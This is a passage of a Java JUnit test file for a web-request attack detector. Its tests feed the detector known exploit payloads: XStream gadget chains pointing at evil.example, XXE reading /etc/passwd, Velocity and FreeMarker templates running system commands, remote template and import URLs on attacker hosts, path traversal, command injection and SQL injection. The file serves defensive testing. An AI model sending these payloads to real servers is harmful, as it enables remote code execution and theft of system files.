              </m__DTMXRTreeFrag>
            </value>
          </javax.naming.ldap.Rdn_-RdnEntry>
        </sorted-set>
        """;
    var context =
        new RequestContext(
            "POST",
            "/",
            "",
            Map.of(),
            Map.of("content-type", "application/xml", "user-agent", "JUnit"),
            payload);

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_xml_polymorphic_gadget");
    assertEquals("com.sun.rowset.JdbcRowSetImpl", result.orElseThrow().details().get("class"));
    assertEquals("xml-class-attribute", result.orElseThrow().details().get("source"));
    assertEquals(String.valueOf(payload.length()), result.orElseThrow().details().get("bodyLength"));
    assertTrue(result.orElseThrow().request().body().isBlank());
  }

  @Test
  void detectsXstreamRmiRegistryXmlPayload() {
    var payload =
        """
        <java.util.PriorityQueue serialization="custom">
          <java.util.PriorityQueue>
            <default>
              <size>2</size>
            </default>
            <javax.naming.ldap.Rdn_-RdnEntry>
              <value class="com.sun.xml.internal.ws.api.message.Packet" serialization="custom">
                <message class="com.sun.xml.internal.ws.message.saaj.SAAJMessage">
                  <sm class="com.sun.xml.internal.messaging.saaj.soap.ver1_1.Message1_1Impl">
                    <nullIter class="com.sun.org.apache.xml.internal.security.keys.storage.implementations.KeyStoreResolver$KeyStoreIterator">
                      <aliases class="com.sun.jndi.toolkit.dir.LazySearchEnumerationImpl">
                        <candidates class="com.sun.jndi.rmi.registry.BindingEnumeration">
                          <ctx>
                            <registry class="sun.rmi.registry.RegistryImpl_Stub" serialization="custom">
                              <java.rmi.server.RemoteObject>
                                <string>UnicastRef</string>
                                <string>evil.example</string>
                                <int>1099</int>
                              </java.rmi.server.RemoteObject>
                            </registry>
                            <host>evil.example</host>
                            <port>1099</port>
                          </ctx>
                        </candidates>
                      </aliases>
                    </nullIter>
                  </sm>
                </message>
              </value>
            </javax.naming.ldap.Rdn_-RdnEntry>
          </java.util.PriorityQueue>
        </java.util.PriorityQueue>
        """;
    var context =
        new RequestContext(
            "POST",
            "/",
            "",
            Map.of(),
            Map.of("content-type", "application/xml", "user-agent", "JUnit"),
            payload);

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_xml_polymorphic_gadget");
    assertEquals("sun.rmi.registry.RegistryImpl_Stub", result.orElseThrow().details().get("class"));
    assertEquals("xml-class-attribute", result.orElseThrow().details().get("source"));
    assertEquals(String.valueOf(payload.length()), result.orElseThrow().details().get("bodyLength"));
    assertTrue(result.orElseThrow().request().body().isBlank());
  }

  @Test
  void ignoresBenignTypedPayloadSafeClass() {
    var payload = "{\"@type\":\"com.example.SafeBean\",\"homepage\":\"ldap://example.com/docs\"}";
    var context =
        new RequestContext(
            "POST",
            "/api/object/import",
            "argumentCollection=" + payload,
            Map.of("argumentCollection", List.of(payload)),
            Map.of("content-type", "application/json", "user-agent", "JUnit"));

    assertTrue(engine.detectRequest(context).isEmpty());
  }

  @Test
  void ignoresBenignXmlPayloadClassMetadata() {
    var payload =
        """
        <map>
          <entry>
            <string>profile</string>
            <value class="java.util.LinkedHashMap">
              <entry><string>name</string><string>vulhub</string></entry>
            </value>
          </entry>
        </map>
        """;
    var context =
        new RequestContext(
            "POST",
            "/orders/3/edit",
            "",
            Map.of(),
            Map.of("content-type", "application/xml", "user-agent", "JUnit"),
            payload);

    assertTrue(engine.detectRequest(context).isEmpty());
  }

  @Test
  void ignoresTypedPayloadWithoutDeserializationTrigger() {
    var payload =
        "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"jdbc:h2:mem:test\"}";
    var context =
        new RequestContext(
            "POST",
            "/api/object/import",
            "argumentCollection=" + payload,
            Map.of("argumentCollection", List.of(payload)),
            Map.of("content-type", "application/json", "user-agent", "JUnit"));

    assertTrue(engine.detectRequest(context).isEmpty());
  }

  @Test
  void detectsSolrCve201712629XmlParserXxePayload() {
    var xml =
        """
        <?xml version="1.0"?>
        <!DOCTYPE message [
          <!ENTITY xxe SYSTEM "file:///etc/passwd">
        ]>
        <message>&xxe;</message>
        """;
    var encodedXml =
        "%3C%3Fxml%20version%3D%221.0%22%3F%3E%3C!DOCTYPE%20message%20%5B%3C!ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2F%2Fetc%2Fpasswd%22%3E%5D%3E%3Cmessage%3E%26xxe%3B%3C%2Fmessage%3E";
    var context =
        new RequestContext(
            "GET",
            "/solr/demo/select",
            "wt=xml&defType=xmlparser&q=" + encodedXml,
            Map.of(
                "wt",
                List.of("xml"),
                "defType",
                List.of("xmlparser"),
                "q",
                List.of(xml)),
            Map.of("user-agent", "JUnit"));

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_xxe_payload");
    assertEquals("q", result.orElseThrow().details().get("parameter"));
    assertEquals("file", result.orElseThrow().details().get("scheme"));
    assertEquals(String.valueOf(xml.length()), result.orElseThrow().details().get("xmlLength"));
    assertEquals(List.of("[redacted]"), result.orElseThrow().request().parameters().get("q"));
    assertTrue(result.orElseThrow().request().query().contains("q=[redacted]"));
  }

  @Test
  void ignoresBenignInternalDoctype() {
    var xml =
        "%3C!DOCTYPE%20note%20%5B%3C!ENTITY%20writer%20%22Alice%22%3E%5D%3E"
            + "%3Cnote%3E%26writer%3B%3C/note%3E";
    var context =
        new RequestContext(
            "POST",
            "/xml/preview",
            "",
            Map.of("xml", List.of(xml)),
            Map.of("user-agent", "JUnit"));

    assertTrue(engine.detectRequest(context).isEmpty());
  }

  @Test
  void detectsSolrCve201917558VelocityTemplateParameter() {
    var template =
        "#set($x='') #set($rt=$x.class.forName('java.lang.Runtime')) "
            + "#set($ex=$rt.getRuntime().exec('id'))";
    var context =
        new RequestContext(
            "GET",
            "/solr/demo/select",
            "q=1&wt=velocity&v.template=custom&v.template.custom=" + template,
            Map.of(
                "q",
                List.of("1"),
                "wt",
                List.of("velocity"),
                "v.template",
                List.of("custom"),
                "v.template.custom",
                List.of(template)),
            Map.of("user-agent", "JUnit"));

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_template_parameter");
    assertEquals("v.template.custom", result.orElseThrow().details().get("parameter"));
    assertEquals("velocity", result.orElseThrow().details().get("engine"));
    assertEquals(
        String.valueOf(template.length()), result.orElseThrow().details().get("sourceLength"));
    assertEquals(
        List.of("[redacted]"),
        result.orElseThrow().request().parameters().get("v.template.custom"));
    assertTrue(result.orElseThrow().request().query().contains("v.template.custom=[redacted]"));
  }

  @Test
  void detectsSolrCve201917558VelocityParameterTemplateLoaderEnable() {
    var body =
        """
        {
          "update-queryresponsewriter": {
            "startup": "lazy",
            "name": "velocity",
            "class": "solr.VelocityResponseWriter",
            "template.base.dir": "",
            "solr.resource.loader.enabled": "true",
            "params.resource.loader.enabled": "true"
          }
        }
        """;
    var context =
        new RequestContext(
            "POST",
            "/solr/demo/config",
            "",
            Map.of(),
            Map.of("user-agent", "JUnit", "content-type", "application/json"),
            body);

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_template_loader_enable");
    assertEquals(
        "body.params.resource.loader.enabled", result.orElseThrow().details().get("parameter"));
    assertEquals("body", result.orElseThrow().details().get("source"));
    assertEquals("velocity", result.orElseThrow().details().get("engine"));
    assertEquals(String.valueOf(body.length()), result.orElseThrow().details().get("sourceLength"));
  }

  @Test
  void ignoresSolrResourceLoaderEnableWithoutParameterTemplates() {
    var body =
        """
        {
          "update-queryresponsewriter": {
            "name": "velocity",
            "class": "solr.VelocityResponseWriter",
            "solr.resource.loader.enabled": "true"
          }
        }
        """;
    var context =
        new RequestContext(
            "POST",
            "/solr/demo/config",
            "",
            Map.of(),
            Map.of("user-agent", "JUnit", "content-type", "application/json"),
            body);

    assertTrue(engine.detectRequest(context).isEmpty());
  }

  @Test
  void ignoresParameterTemplateLoaderEnableWithoutTemplateEngineSignal() {
    var body =
        """
        {"name":"json","params.resource.loader.enabled":"true"}
        """;
    var context =
        new RequestContext(
            "POST",
            "/solr/demo/config",
            "",
            Map.of(),
            Map.of("user-agent", "JUnit", "content-type", "application/json"),
            body);

    assertTrue(engine.detectRequest(context).isEmpty());
  }

  @Test
  void detectsJiraContactAdministratorVelocityTemplateParameter() {
    var template =
        "$i18n.getClass().forName('java.lang.Runtime').getMethod('getRuntime', null)"
            + ".invoke(null, null).exec('whoami').toString()";
    var context =
        new RequestContext(
            "POST",
            "/secure/ContactAdministrators.jspa",
            "subject=" + template + "&details=v",
            Map.of("subject", List.of(template), "details", List.of("v")),
            Map.of("user-agent", "JUnit", "content-type", "application/x-www-form-urlencoded"));

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_template_parameter");
    assertEquals("subject", result.orElseThrow().details().get("parameter"));
    assertEquals("velocity", result.orElseThrow().details().get("engine"));
    assertEquals(
        String.valueOf(template.length()), result.orElseThrow().details().get("sourceLength"));
    assertEquals(List.of("[redacted]"), result.orElseThrow().request().parameters().get("subject"));
    assertTrue(result.orElseThrow().request().query().contains("subject=[redacted]"));
  }

  @Test
  void ignoresRuntimeWordsInPlainContactMessage() {
    var message = "Please review why java.lang.Runtime.getRuntime().exec appears in this log.";
    var context =
        new RequestContext(
            "POST",
            "/secure/ContactAdministrators!default.jspa",
            "",
            Map.of("details", List.of(message)),
            Map.of("user-agent", "JUnit", "content-type", "application/x-www-form-urlencoded"));

    assertTrue(engine.detectRequest(context).isEmpty());
  }

  @Test
  void ignoresBenignTemplateParameter() {
    var context =
        new RequestContext(
            "GET",
            "/solr/demo/select",
            "q=1&wt=velocity&v.template=custom&v.template.custom=#set($title='hello')$title",
            Map.of(
                "q",
                List.of("1"),
                "wt",
                List.of("velocity"),
                "v.template",
                List.of("custom"),
                "v.template.custom",
                List.of("#set($title='hello')$title")),
            Map.of("user-agent", "JUnit"));

    assertTrue(engine.detectRequest(context).isEmpty());
  }

  @Test
  void detectsFreemarkerTemplatePayloadInJsonSqlBody() {
    var template =
        "select 'result:<#assign ex=\"freemarker.template.utility.Execute\"?new()>"
            + " ${ex(\"id\")}'";
    var body = "{\"sql\":\"" + jsonString(template) + "\"}";
    var context =
        new RequestContext(
            "POST",
            "/jmreport/queryFieldBySql",
            "",
            Map.of(),
            Map.of("user-agent", "JUnit", "content-type", "application/json"),
            body);

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_template_parameter");
    assertEquals("body.sql", result.orElseThrow().details().get("parameter"));
    assertEquals("freemarker", result.orElseThrow().details().get("engine"));
    assertEquals(
        String.valueOf(template.length()), result.orElseThrow().details().get("sourceLength"));
  }

  @Test
  void detectsFreemarkerTemplatePayloadInStrongJsonTemplateField() {
    var template = "<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ex(\"id\")}";
    var body = "{\"templateBody\":\"" + jsonString(template) + "\"}";
    var context =
        new RequestContext(
            "POST",
            "/api/render",
            "",
            Map.of(),
            Map.of("user-agent", "JUnit", "content-type", "application/json"),
            body);

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_template_parameter");
    assertEquals("body.templateBody", result.orElseThrow().details().get("parameter"));
    assertEquals("freemarker", result.orElseThrow().details().get("engine"));
  }

  @Test
  void ignoresBenignTemplatePayloadInJsonSqlBody() {
    var body = "{\"sql\":\"select '${name}' as display_name\"}";
    var context =
        new RequestContext(
            "POST",
            "/jmreport/queryFieldBySql",
            "",
            Map.of(),
            Map.of("user-agent", "JUnit", "content-type", "application/json"),
            body);

    assertTrue(engine.detectRequest(context).isEmpty());
  }

  @Test
  void ignoresWeakTemplateBodyFieldOutsideTemplateContext() {
    var template = "<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ex(\"id\")}";
    var context =
        new RequestContext(
            "POST",
            "/api/comments",
            "",
            Map.of(),
            Map.of("user-agent", "JUnit", "content-type", "application/json"),
            "{\"sql\":\"" + jsonString(template) + "\"}");

    assertTrue(engine.detectRequest(context).isEmpty());
  }

  @Test
  void detectsTemplateSourceSensitiveFileInJsonBody() {
    var body =
        """
        {"contentId":"786458","macro":{"name":"widget","body":"","params":{
          "url":"https://www.viddler.com/v/23464dc6",
          "_template":". /web.xml"
        }}}
        """;
    var context =
        new RequestContext(
            "POST",
            "/rest/tinymce/1/macro/preview",
            "",
            Map.of(),
            Map.of("user-agent", "JUnit", "content-type", "application/json; charset=utf-8"),
            body);

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_template_source");
    assertEquals("body", result.orElseThrow().details().get("source"));
    assertEquals("body._template", result.orElseThrow().details().get("parameter"));
    assertEquals("sensitive-file", result.orElseThrow().details().get("targetType"));
    assertEquals("10", result.orElseThrow().details().get("valueLength"));
  }

  @Test
  void detectsRemoteTemplateSourceInJsonBody() {
    var body =
        "{\"macro\":{\"name\":\"widget\",\"params\":{\"_template\":\"https://attacker.example/poc.vm\"}}}";
    var context =
        new RequestContext(
            "POST",
            "/rest/tinymce/1/macro/preview",
            "",
            Map.of(),
            Map.of("user-agent", "JUnit", "content-type", "application/json"),
            body);

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_template_source");
    assertEquals("remote-url", result.orElseThrow().details().get("targetType"));
  }

  @Test
  void ignoresBenignMacroPreviewMediaUrlAndTemplateName() {
    var body =
        """
        {"macro":{"name":"widget","params":{
          "url":"https://www.viddler.com/v/23464dc6",
          "_template":"widget-default.vm"
        }}}
        """;
    var context =
        new RequestContext(
            "POST",
            "/rest/tinymce/1/macro/preview",
            "",
            Map.of(),
            Map.of("user-agent", "JUnit", "content-type", "application/json"),
            body);

    assertTrue(engine.detectRequest(context).isEmpty());
  }

  @Test
  void ignoresTemplateSourceOutsideTemplateControlContext() {
    var context =
        new RequestContext(
            "POST",
            "/api/preferences",
            "",
            Map.of(),
            Map.of("user-agent", "JUnit", "content-type", "application/json"),
            "{\"_template\":\"https://attacker.example/poc.vm\"}");

    assertTrue(engine.detectRequest(context).isEmpty());
  }

  @Test
  void detectsRemoteDecoratorTemplateSourceParameter() {
    var context =
        new RequestContext(
            "POST",
            "/webtools/control/forgotPassword/StatsSinceStart",
            "statsDecoratorLocation=http://evil.example/ofbiz/payload.xml",
            Map.of("statsDecoratorLocation", List.of("http://evil.example/ofbiz/payload.xml")),
            Map.of("user-agent", "JUnit", "content-type", "application/x-www-form-urlencoded"));

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_template_source");
    assertEquals("parameter", result.orElseThrow().details().get("source"));
    assertEquals("statsDecoratorLocation", result.orElseThrow().details().get("parameter"));
    assertEquals("remote-url", result.orElseThrow().details().get("targetType"));
    assertEquals("[redacted]", result.orElseThrow().request().parameters().get("statsDecoratorLocation").get(0));
    assertEquals("statsDecoratorLocation=[redacted]", result.orElseThrow().request().query());
  }

  @Test
  void detectsColdFusionMetadataClassnameTemplateSourceParameter() {
    var target = "../../../../../../../../proc/self/environ";
    var payload = "{\"_metadata\":{\"classname\":\"" + target + "\"}}";
    var context =
        new RequestContext(
            "POST",
            "/cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/iedit.cfc",
            "method=foo&_cfclient=true&_variables=" + payload,
            Map.of("_variables", List.of(payload)),
            Map.of("content-type", "application/x-www-form-urlencoded", "user-agent", "JUnit"));

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_template_source");
    assertEquals("parameter", result.orElseThrow().details().get("source"));
    assertEquals("_variables.classname", result.orElseThrow().details().get("parameter"));
    assertEquals("path-traversal", result.orElseThrow().details().get("targetType"));
    assertEquals(String.valueOf(target.length()), result.orElseThrow().details().get("valueLength"));
    assertEquals(List.of("[redacted]"), result.orElseThrow().request().parameters().get("_variables"));
    assertTrue(result.orElseThrow().request().query().contains("_variables=[redacted]"));
    assertFalse(result.orElseThrow().request().query().contains("proc/self/environ"));
  }

  @Test
  void detectsLocaleTraversalTemplateSourceParameter() {
    var target = "../../../../../../../../../../etc/passwd\u0000en";
    var context =
        new RequestContext(
            "GET",
            "/CFIDE/administrator/enter.cfm",
            "locale=../../../../../../../../../../etc/passwd%00en",
            Map.of("locale", List.of(target)),
            Map.of("user-agent", "JUnit"));

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_template_source");
    assertEquals("parameter", result.orElseThrow().details().get("source"));
    assertEquals("locale", result.orElseThrow().details().get("parameter"));
    assertEquals("path-traversal", result.orElseThrow().details().get("targetType"));
    assertEquals(String.valueOf(target.length()), result.orElseThrow().details().get("valueLength"));
    assertEquals(List.of("[redacted]"), result.orElseThrow().request().parameters().get("locale"));
    assertEquals("locale=[redacted]", result.orElseThrow().request().query());
  }

  @Test
  void ignoresBenignLocaleTemplateSourceParameter() {
    var context =
        new RequestContext(
            "GET",
            "/CFIDE/administrator/enter.cfm",
            "locale=en_US",
            Map.of("locale", List.of("en_US")),
            Map.of("user-agent", "JUnit"));

    assertTrue(engine.detectRequest(context).isEmpty());
  }

  @Test
  void ignoresBenignMetadataClassnameTemplateSourceParameter() {
    var payload = "{\"_metadata\":{\"classname\":\"com.example.SafeDto\"}}";
    var context =
        new RequestContext(
            "POST",
            "/cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/iedit.cfc",
            "method=foo&_cfclient=true&_variables=" + payload,
            Map.of("_variables", List.of(payload)),
            Map.of("content-type", "application/x-www-form-urlencoded", "user-agent", "JUnit"));

    assertTrue(engine.detectRequest(context).isEmpty());
  }

  @Test
  void ignoresRemoteDecoratorLocationOutsideTemplateControlContext() {
    var context =
        new RequestContext(
            "POST",
            "/api/preferences",
            "statsDecoratorLocation=http://evil.example/ofbiz/payload.xml",
            Map.of("statsDecoratorLocation", List.of("http://evil.example/ofbiz/payload.xml")),
            Map.of("user-agent", "JUnit"));

    assertTrue(engine.detectRequest(context).isEmpty());
  }

  @Test
  void detectsSolrRemoteStreamingParameterConfigEnable() {
    var config =
        """
        {"set-property":{"requestDispatcher.requestParsers.enableRemoteStreaming":true}}
        """;
    var context =
        new RequestContext(
            "POST",
            "/solr/demo/config",
            "",
            Map.of("config", List.of(config)),
            Map.of("user-agent", "JUnit"));

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_remote_content_stream");
    assertEquals("enable-config", result.orElseThrow().details().get("mode"));
    assertEquals("config", result.orElseThrow().details().get("parameter"));
    assertEquals("remote-streaming", result.orElseThrow().details().get("scheme"));
  }

  @Test
  void detectsSolrRemoteStreamingJsonBodyConfigEnable() {
    var body =
        """
        {"set-property":{"requestDispatcher.requestParsers.enableRemoteStreaming":true}}
        """;
    var context =
        new RequestContext(
            "POST",
            "/solr/demo/config",
            "",
            Map.of(),
            Map.of("user-agent", "JUnit", "content-type", "application/json"),
            body);

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_remote_content_stream");
    assertEquals("enable-config", result.orElseThrow().details().get("mode"));
    assertEquals("body", result.orElseThrow().details().get("parameter"));
    assertEquals("remote-streaming", result.orElseThrow().details().get("scheme"));
  }

  @Test
  void detectsSolrRemoteStreamingFileUrl() {
    var context =
        new RequestContext(
            "GET",
            "/solr/demo/debug/dump",
            "stream.url=file:///etc/passwd",
            Map.of("stream.url", List.of("file:///etc/passwd")),
            Map.of("user-agent", "JUnit"));

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_remote_content_stream");
    assertEquals("stream-url", result.orElseThrow().details().get("mode"));
    assertEquals("stream.url", result.orElseThrow().details().get("parameter"));
    assertEquals("file", result.orElseThrow().details().get("scheme"));
    assertEquals("[redacted]", result.orElseThrow().request().parameters().get("stream.url").get(0));
    assertEquals("stream.url=[redacted]", result.orElseThrow().request().query());
  }

  @Test
  void ignoresExternalRemoteContentStreamUrl() {
    var context =
        new RequestContext(
            "GET",
            "/solr/demo/debug/dump",
            "stream.url=https://example.com/feed.xml",
            Map.of("stream.url", List.of("https://example.com/feed.xml")),
            Map.of("user-agent", "JUnit"));

    assertTrue(engine.detectRequest(context).isEmpty());
  }

  @Test
  void detectsRemoteImportIntoScriptWriteTarget() {
    var parameters = new LinkedHashMap<String, List<String>>();
    parameters.put("DATAFILE_LOCATION", List.of("http://attacker/rcereport.csv"));
    parameters.put(
        "DATAFILE_SAVE", List.of("./applications/accounting/webapp/accounting/index.jsp"));
    parameters.put("DATAFILE_IS_URL", List.of("true"));
    parameters.put("DEFINITION_LOCATION", List.of("http://attacker/rceschema.xml"));
    parameters.put("DEFINITION_IS_URL", List.of("true"));
    parameters.put("DEFINITION_NAME", List.of("rce"));
    var context =
        new RequestContext(
            "POST",
            "/webtools/control/forgotPassword/viewdatafile",
            "DATAFILE_LOCATION=http://attacker/rcereport.csv&DATAFILE_SAVE=./applications/accounting/webapp/accounting/index.jsp&DATAFILE_IS_URL=true&DEFINITION_LOCATION=http://attacker/rceschema.xml&DEFINITION_IS_URL=true&DEFINITION_NAME=rce",
            parameters,
            Map.of("user-agent", "JUnit"));

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_remote_import_script_write");
    assertEquals("DATAFILE_LOCATION", result.orElseThrow().details().get("sourceParameter"));
    assertEquals("DATAFILE_SAVE", result.orElseThrow().details().get("targetParameter"));
    assertEquals("jsp", result.orElseThrow().details().get("targetType"));
    assertEquals("2", result.orElseThrow().details().get("remoteSourceCount"));
    assertEquals("[redacted]", result.orElseThrow().request().parameters().get("DATAFILE_SAVE").get(0));
    assertEquals(
        "DATAFILE_LOCATION=[redacted]&DATAFILE_SAVE=[redacted]&DATAFILE_IS_URL=true&DEFINITION_LOCATION=[redacted]&DEFINITION_IS_URL=true&DEFINITION_NAME=rce",
        result.orElseThrow().request().query());
  }

  @Test
  void ignoresRemoteImportIntoDataFileTarget() {
    var context =
        new RequestContext(
            "POST",
            "/webtools/control/viewdatafile",
            "",
            Map.of(
                "DATAFILE_LOCATION",
                List.of("http://example.com/report.csv"),
                "DATAFILE_SAVE",
                List.of("./runtime/uploads/report.csv"),
                "DATAFILE_IS_URL",
                List.of("true")),
            Map.of("user-agent", "JUnit"));

    assertTrue(engine.detectRequest(context).isEmpty());
  }

  @Test
  void ignoresLocalImportIntoScriptTarget() {
    var context =
        new RequestContext(
            "POST",
            "/webtools/control/viewdatafile",
            "",
            Map.of(
                "DATAFILE_LOCATION",
                List.of("./runtime/import/report.csv"),
                "DATAFILE_SAVE",
                List.of("./applications/accounting/webapp/accounting/index.jsp"),
                "DATAFILE_IS_URL",
                List.of("false")),
            Map.of("user-agent", "JUnit"));

    assertTrue(engine.detectRequest(context).isEmpty());
  }

  @Test
  void detectsElasticsearchWooYun2015110216SnapshotRepositoryWebrootWrite() {
    var location = "/usr/local/tomcat/webapps/wwwroot/";
    var body =
        "{\"type\":\"fs\",\"settings\":{\"location\":\""
            + location
            + "\",\"compress\":false}}";
    var context =
        new RequestContext(
            "PUT",
            "/_snapshot/yz.jsp",
            "",
            Map.of(),
            Map.of("user-agent", "JUnit", "content-type", "application/json"),
            body);

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_repository_webroot_write");
    assertEquals("body.location", result.orElseThrow().details().get("targetParameter"));
    assertEquals("jsp", result.orElseThrow().details().get("targetType"));
    assertEquals("webroot", result.orElseThrow().details().get("locationType"));
    assertEquals(
        String.valueOf(location.length()), result.orElseThrow().details().get("valueLength"));
    assertTrue(result.orElseThrow().request().body().isBlank());
  }

  @Test
  void ignoresElasticsearchSnapshotRepositoryUnderConfiguredRepo() {
    var body =
        "{\"type\":\"fs\",\"settings\":{\"location\":\"/usr/share/elasticsearch/repo/test\"}}";
    var context =
        new RequestContext(
            "PUT",
            "/_snapshot/test",
            "",
            Map.of(),
            Map.of("user-agent", "JUnit", "content-type", "application/json"),
            body);

    assertTrue(engine.detectRequest(context).isEmpty());
  }

  @Test
  void ignoresWebrootSnapshotRepositoryWithoutScriptSelector() {
    var body =
        "{\"type\":\"fs\",\"settings\":{\"location\":\"/usr/local/tomcat/webapps/backups\"}}";
    var context =
        new RequestContext(
            "PUT",
            "/_snapshot/daily-backup",
            "",
            Map.of(),
            Map.of("user-agent", "JUnit", "content-type", "application/json"),
            body);

    assertTrue(engine.detectRequest(context).isEmpty());
  }

  @Test
  void detectsOpenTsdbCve202035476YrangePlotCommandInjection() {
    var payload = "[0:system('touch /tmp/success')]";
    var context =
        new RequestContext(
            "GET",
            "/q",
            "start=2000/10/21-00:00:00&m=sum:sys.cpu.nice&yrange=[0:system(%27touch%20/tmp/success%27)]&wxh=1516x644&style=linespoint&grid=t&json",
            Map.of(
                "start",
                List.of("2000/10/21-00:00:00"),
                "m",
                List.of("sum:sys.cpu.nice"),
                "yrange",
                List.of(payload),
                "wxh",
                List.of("1516x644"),
                "style",
                List.of("linespoint"),
                "grid",
                List.of("t"),
                "json",
                List.of("")),
            Map.of("user-agent", "JUnit"));

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_plot_command_injection");
    assertEquals("yrange", result.orElseThrow().details().get("parameter"));
    assertEquals(String.valueOf(payload.length()), result.orElseThrow().details().get("valueLength"));
    assertEquals(List.of("[redacted]"), result.orElseThrow().request().parameters().get("yrange"));
    assertTrue(result.orElseThrow().request().query().contains("yrange=[redacted]"));
    assertFalse(result.orElseThrow().request().query().contains("system"));
  }

  @Test
  void detectsOpenTsdbCve202325826KeyPlotCommandInjection() {
    var payload = ";system \"touch /tmp/poc\" \"";
    var context =
        new RequestContext(
            "GET",
            "/q",
            "start=2000/10/21-00:00:00&m=sum:sys.cpu.nice&y2range=[42:42]&key=%3Bsystem%20%22touch%20/tmp/poc%22%20%22&wxh=1516x644&style=linespoint&grid=t&json",
            Map.of(
                "start",
                List.of("2000/10/21-00:00:00"),
                "m",
                List.of("sum:sys.cpu.nice"),
                "y2range",
                List.of("[42:42]"),
                "key",
                List.of(payload),
                "wxh",
                List.of("1516x644"),
                "style",
                List.of("linespoint"),
                "grid",
                List.of("t"),
                "json",
                List.of("")),
            Map.of("user-agent", "JUnit"));

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_plot_command_injection");
    assertEquals("key", result.orElseThrow().details().get("parameter"));
    assertEquals(List.of("[redacted]"), result.orElseThrow().request().parameters().get("key"));
    assertTrue(result.orElseThrow().request().query().contains("key=[redacted]"));
    assertFalse(result.orElseThrow().request().query().contains("touch"));
  }

  @Test
  void ignoresBenignPlotRangeParameters() {
    var context =
        new RequestContext(
            "GET",
            "/q",
            "start=2000/10/21-00:00:00&m=sum:sys.cpu.nice&yrange=[0:100]&key=out%20right%20top&wxh=1516x644&style=linespoint&grid=t&json",
            Map.of(
                "start",
                List.of("2000/10/21-00:00:00"),
                "m",
                List.of("sum:sys.cpu.nice"),
                "yrange",
                List.of("[0:100]"),
                "key",
                List.of("out right top"),
                "wxh",
                List.of("1516x644"),
                "style",
                List.of("linespoint"),
                "grid",
                List.of("t"),
                "json",
                List.of("")),
            Map.of("user-agent", "JUnit"));

    assertTrue(engine.detectRequest(context).isEmpty());
  }

  @Test
  void ignoresPlotCommandValueOutsideGraphContext() {
    var context =
        new RequestContext(
            "GET",
            "/settings",
            "key=%3Bsystem%20%22touch%20/tmp/poc%22%20%22&mode=test",
            Map.of("key", List.of(";system \"touch /tmp/poc\" \""), "mode", List.of("test")),
            Map.of("user-agent", "JUnit"));

    assertTrue(engine.detectRequest(context).isEmpty());
  }

  @Test
  void detectsJsonSortSqlInjection() {
    var payload = ",if(1=1,sleep(2),0)";
    var body =
        """
        {"orders":[{"name":"name","type":"%s"}],"components":[],"filters":{}}
        """
            .formatted(payload);
    var context =
        new RequestContext(
            "POST",
            "/test/case/list/1/10",
            "",
            Map.of(),
            Map.of("user-agent", "JUnit", "content-type", "application/json"),
            body);

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_sql_sort_injection");
    assertEquals("type", result.orElseThrow().details().get("field"));
    assertEquals(String.valueOf(payload.length()), result.orElseThrow().details().get("valueLength"));
    assertTrue(result.orElseThrow().request().body().isBlank());
  }

  @Test
  void detectsSkyWalkingGraphqlSqlIdentifierInjection() {
    var payload = "sqli where 1=1 --";
    var body =
        """
        {
          "query":"query queryLogs($condition: LogQueryCondition) { queryLogs(condition: $condition) { total } }",
          "variables":{"condition":{"metricName":"%s","state":"ALL","paging":{"pageSize":10}}}
        }
        """
            .formatted(payload);
    var context =
        new RequestContext(
            "POST",
            "/graphql",
            "",
            Map.of(),
            Map.of("user-agent", "JUnit", "content-type", "application/json"),
            body);

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_sql_identifier_injection");
    assertEquals("metricName", result.orElseThrow().details().get("field"));
    assertEquals(String.valueOf(payload.length()), result.orElseThrow().details().get("valueLength"));
    assertTrue(result.orElseThrow().request().body().isBlank());
  }

  @Test
  void ignoresBenignGraphqlMetricIdentifier() {
    var body =
        """
        {
          "query":"query queryLogs($condition: LogQueryCondition) { queryLogs(condition: $condition) { total } }",
          "variables":{"condition":{"metricName":"service_instance_jvm_memory.max","state":"ALL"}}
        }
        """;
    var context =
        new RequestContext(
            "POST",
            "/graphql",
            "",
            Map.of(),
            Map.of("user-agent", "JUnit", "content-type", "application/json"),
            body);

    assertTrue(engine.detectRequest(context).isEmpty());
  }

  @Test
  void ignoresBenignJsonSortDirection() {
    var body =
        """
        {"orders":[{"name":"name","type":"asc"}],"components":[],"filters":{}}
        """;
    var context =
        new RequestContext(
            "POST",
            "/test/case/list/1/10",
            "",
            Map.of(),
            Map.of("user-agent", "JUnit", "content-type", "application/json"),
            body);

    assertTrue(engine.detectRequest(context).isEmpty());
  }

  @Test
  void ignoresSqlLikeTypeOutsideSortContext() {
    var body =
        """
        {"type":",if(1=1,sleep(2),0)","message":"diagnostic"}
        """;
    var context =
        new RequestContext(
            "POST",
            "/api/preferences",
            "",
            Map.of(),
            Map.of("user-agent", "JUnit", "content-type", "application/json"),
            body);

    assertTrue(engine.detectRequest(context).isEmpty());
  }

  @Test
  void ignoresBenignGatewayRouteConfig() {
    var context =
        new RequestContext(
            "POST",
            "/actuator/gateway/routes/report",
            "",
            Map.of(
                "routeConfig",
                List.of(
